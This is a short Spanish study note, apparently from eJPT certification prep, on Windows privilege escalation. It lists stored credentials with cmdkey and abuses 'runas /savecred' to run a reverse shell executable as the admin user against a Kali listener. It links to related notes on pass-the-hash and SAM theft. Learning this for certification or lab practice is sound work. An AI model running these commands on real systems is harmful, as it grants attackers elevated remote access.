
- Enumere las credenciales guardadas:

```
cmdkey /list
```
Tenga en cuenta que las credenciales para el usuario "admin" se guardan. Si no lo son, ejecute el script C:\PrivEsc\savecred.bat para actualizar las credenciales guardadas.

- Inicie un oyente en Kali y ejecute el ejecutable reverse.exe usando runas con las credenciales guardadas del usuario administrador:

```
runas /savecred /user:admin C:\PrivEsc\reverse.exe
```

enlace:
[[Local/Ciberseguridad/HACKING/CERTIFICACIONES/EJPT/Preparacion-Ejpt]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Windows/Herramientas]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Windows/Passwords - Passing the Hash]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Windows/Passwords - Registry]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Windows/Passwords - Security Account Manager (SAM)]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Windows/Generate a Reverse Shell Executable]]

